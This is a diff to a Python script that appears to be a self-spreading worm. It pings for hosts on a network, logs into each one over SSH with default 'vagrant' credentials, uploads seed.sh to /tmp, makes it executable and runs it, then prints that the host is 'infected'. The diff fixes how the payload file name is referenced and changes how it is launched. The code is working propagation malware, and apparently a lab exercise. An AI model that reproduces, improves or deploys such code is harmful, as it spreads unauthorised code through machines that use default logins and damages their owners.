@@ -3,6 +3,7 @@ import os
 import paramiko
 import sys
 def run(**args):
+    fileName = "seed.sh"
     myList = []
     # Function to ping and find all hosts on a network
     def pinger(hostname):
@@ -29,10 +30,11 @@ def run(**args):
         try:
             ssh.connect(ipAddr, username="vagrant", password="vagrant")
             sftpClient = ssh.open_sftp()
-            sftpClient.put("../" + seed.sh, "/tmp/" + seed.sh)
-            ssh.exec_command("chmod a+x /tmp/" + seed.sh)
+            sftpClient.put("../" + fileName, "/tmp/" + fileName)
+            ssh.exec_command("chmod a+x /tmp/" + fileName)
             print "[+] " + ipAddr + " infected."
-            ssh.exec_command("nohup /tmp/" +seed.sh+ " &")
+            ssh.exec_command("./tmp/" +fileName)
+            ssh.exec_command("\n")
         except paramiko.AuthenticationException:
             print "[-] Failed! ..."
 
